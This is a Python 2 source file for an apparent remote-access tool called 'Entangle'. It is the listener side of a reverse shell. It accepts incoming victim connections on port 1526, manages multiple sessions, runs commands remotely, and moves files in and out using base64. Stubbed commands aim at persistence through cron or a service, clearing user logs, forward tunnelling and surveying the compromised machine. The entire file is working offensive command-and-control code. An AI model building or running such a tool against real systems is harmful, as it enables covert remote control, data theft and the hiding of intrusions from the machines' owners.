import socket
import json
import threading
import base64
import datetime
import os


def basedir():
    if not os.path.exists(base_dir):
        try:
            os.mkdir(base_dir)
        except OSError:
            print("Error: Could not create %s directory" % base_dir)
        else:
            print("Alert: Successful created the directory %s" % base_dir)
    else:
        print("Directory already exists!")


def shell(target, ip):
    """Managing the shell commands. This function contains 2 additional functions called send and receive"""

    def send(data):
        """Responsible for sending data"""
        try:
            json_data = json.dumps(data)
            target.send(json_data)
        except ValueError:
            pass

    def receive():
        """Responsible for receiving data"""
        data = ""
        while True:
            try:
                data = data + target.recv(1024)
                return json.loads(data)
            except ValueError:
                continue

    global count

    while True:
        command_input = raw_input("Session~# ")  # How to interact with the shell
        send(command_input)
        if command_input == "":  # will not hang if nothing is entered and user press enter. Probably will change it to show all commands possible
            continue

        elif command_input == 'detach':  # detach from session but not close connection
            break

        elif command_input == "quit":  # close connection
            target.close()
            targets.remove(target)
            ips.remove(ip)
            break

        elif command_input[:8] == "download":  # download file. will be using b64
            location = (base_dir + "/" + command_input[9:])
            with open(location, "wb") as file:
                file_data = receive()
                file.write(base64.b64decode(file_data))
                print ("File was successfully downloaded at %s " % location)

        elif command_input[:6] == "upload":  # upload file. will be using b64
            with open(command_input[7:], "rb") as uload:
                send(base64.b64encode(uload.read()))

        elif command_input == "persist":  # will attempt to persist payload via cronjob or service
            continue

        elif command_input == "clean":  # will attempt to clean all user logs (Probably will not get everything)
            pass

        elif command_input == "ftunnel":  # Attempt to make a forward tunnel
            pass

        elif command_input == "survey":  # will do a basic survey of the machine
            pass

        elif command_input[:2] == "cd" and len(command_input) > 1:  # change directory
            continue
        else:
            result = receive()
            print(result)


def server():
    """Managing the Server"""
    global clients
    now = datetime.datetime.now()
    while True:
        if stop_threads:
            break
        # s.settimeout(1) # if enabled , I get an error trying to run commands
        try:
            target, ip = s.accept()
            targets.append(target)
            ips.append(ip)
            print ("Connection from: IP: " + ip[0] + now.strftime(" was established. Time of connection was: %Y-%m-%d "
                                                                  "%H:%M:%S"))
            # print(str(ips[clients]) + " Has Connected!")
            clients += 1
        except:
            pass


if __name__ == "__main__":
    global s
    base_dir = "/var/entangle"

    basedir()
    ips = []
    targets = []
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", 1526))  # server bind.  TODO. will make these arguments variables
    s.listen(5)

    clients = 0  # client count
    stop_threads = False

    print("Waiting for connections ....")

    t1 = threading.Thread(target=server)  # allowing for multiple threads of the server
    t1.start()

    while True:
        command = raw_input("Entangle: ")  # How to interact with the application
        if command == "list":  # show a list of all active connections
            count = 0
            for ip in ips:
                print ("Session " + str(count) + " ----> " + str(ip))
                count += 1

        elif command[:7] == "session":  # switch between different sessions
            try:
                num = int(command[8:])
                target_number = targets[num]
                target_ip = ips[num]
                shell(target_number, target_ip)
            except IndexError:
                print("Session not %s Found!" % num)
                continue
        elif command == "exit":  # Close server
            for target in targets:
                target.close()
            s.close()
            stop_threads = True
            t1.join()
            break
